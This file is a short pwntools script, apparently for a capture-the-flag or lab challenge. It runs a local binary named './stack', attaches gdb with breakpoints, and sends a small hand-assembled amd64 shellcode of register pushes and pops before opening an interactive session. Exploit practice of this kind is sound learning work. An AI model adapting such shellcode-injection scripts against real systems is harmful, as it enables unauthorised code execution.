from pwn import *

binary = './stack'

# For local testing
p = process(binary)

s = '''
b * main
b * validate+391
'''
gdb.attach(p, s)
# Clean shellcode with no comments
shellcode = asm('''
	pop rax
	pop rdx
	pop rbx
	push rbx
	push r8
	pop rcx
	push rcx
	pop r8
''', arch='amd64')

p.send(shellcode)
p.interactive()
